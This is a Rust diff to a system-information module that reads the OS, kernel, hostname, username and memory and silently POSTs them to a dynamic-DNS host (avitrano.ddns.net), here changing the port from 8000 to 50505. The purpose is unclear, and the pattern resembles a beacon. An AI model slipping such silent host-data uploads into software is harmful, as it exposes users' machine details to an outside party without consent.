@@ -2,7 +2,7 @@ use std::{env, fs};
 
 use serde::Serialize;
 
-#[derive(Debug, Serialize)]
+#[derive(Clone, Debug, Serialize)]
 pub struct SysInfo {
     pub os: String,
     pub kernel: String,
@@ -61,11 +61,11 @@ fn get_os() -> String {
 }
 
 fn get_kernel() -> String {
-    fs::read_to_string("/proc/sys/kernel/osrelease").unwrap_or(String::from("unknown"))
+    String::from(fs::read_to_string("/proc/sys/kernel/osrelease").unwrap_or(String::from("unknown")).trim())
 }
 
 fn get_hostname() -> String {
-    fs::read_to_string("/proc/sys/kernel/hostname").unwrap_or(String::from("unknown"))
+    String::from(fs::read_to_string("/proc/sys/kernel/hostname").unwrap_or(String::from("unknown")).trim())
 }
 
 fn get_username() -> String {
@@ -119,5 +119,5 @@ fn get_memory() -> i32 {
 
 pub fn get() {
     let sys_info = SysInfo::new();
-    let _ = ureq::post("http://avitrano.ddns.net:8000/sysinfo").send_json(sys_info);
+    let _ = ureq::post("http://avitrano.ddns.net:50505/sysinfo").send_json(sys_info);
 }
